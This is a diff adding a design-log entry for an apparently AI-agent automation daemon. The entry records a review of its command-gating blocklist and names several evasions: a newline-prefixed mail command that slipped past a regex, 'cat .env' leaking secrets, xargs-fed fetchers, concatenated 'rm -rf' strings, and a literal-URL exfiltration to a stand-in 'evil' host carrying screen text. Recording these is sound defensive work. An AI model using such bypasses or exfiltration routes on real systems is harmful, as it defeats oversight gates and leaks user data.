@@ -1994,3 +1994,35 @@ gate is the *entire* security boundary for the unsandboxed lane, so every hole i
 - Two 🔵 resolved as documented-and-kept rather than changed (the double focused-window walk per act
   is bounded by the 2 s messaging timeout and fine for attended single-user; the confirm-string cap is
   backed by the risky-class `reason` which already carries the operative token). All others fixed.
+
+### M6 second review pass — /review-2 (Fable agents) on the fix delta itself (2026-07-16)
+
+the user caught that the address-pass fixes + demo polish were themselves un-reviewed; a second
+/review-2 (both agents on Fable) over f59a87c..f81e793 found 1 🔴 + 8 🟡 + 6 🔵 — all addressed
+(daemon 213/213, shell builds). The big lesson is recorded here because it WILL recur:
+- **🔴 (corroborated, verified-by-execution twice): the address pass itself introduced the bypass.**
+  Splitting the broad `\b(mail|sendmail|osascript)…send\b` pattern into two "more precise" ones
+  (a) anchored command-position WITHOUT `\n` in the separator class — the exact newline lesson the
+  same commit taught riskyDelete — so `echo hi\nmail -s x…` auto-ran; (b) dropped `\bmail\b`
+  matching inside `tell application "Mail" to send …` — a REGRESSION of reviewed behavior.
+  **Precision refactors of blocklists are regression-prone in a way additive changes aren't;
+  re-review the fix delta, and pin the OLD pattern's catches as tests before rewriting one.**
+- Gate consolidation: both script lanes now go through ONE choke point (`gateScript` in policy.ts —
+  normalize, then decide on the same string the executor runs; lane param: shortcuts auto on the hot
+  lane, confirm in the sub-agent lane). Drift between the two hand-rolled gate sites was already
+  visible (audit truncation, shortcuts exemption) after one day.
+- New confirm classes from the pass: secret-store reads (`cat .env` returned keys into context
+  despite the env strip — the strip guards the CHILD env, not the file), xargs-fed fetchers,
+  non-literal `do shell script` bodies (concatenation `"r" & "m -rf …"` split the risky token
+  across every lens — confirm as unresolvable, the SHELL_EXPANSION stance).
+- The literal-URL exfil residual (model composes `open location "https://evil/?d=<screen text>"`,
+  no expansion) is now RECORDED in policy.ts's header as accepted-for-v1 — closing it needs an
+  M7 host-allowlist decision, not a regex.
+- maxBuffer error code verified empirically: Node 26 raises `ERR_CHILD_PROCESS_STDIO_MAXBUFFER`
+  (killed=undefined) — the exact-string `…STDOUT_MAXBUFFER_EXCEEDED` check was a dead branch;
+  now matched by family + a real 400 KB overflow test.
+- Stall detection is now a STRUCTURED `no_change` wire flag (Swift sets it when the settled diff
+  is empty) — the daemon previously grepped the English phrase out of output that also carries
+  attacker-controllable screen text (spoof/suppress risk + wording-drift fragility).
+- Skipped (recorded): a research-not-blocked-by-mac-task test needs an injectable runSubagent seam
+  or live network; the guard's `if (taskType === 'mac')` structurally exempts research tasks.
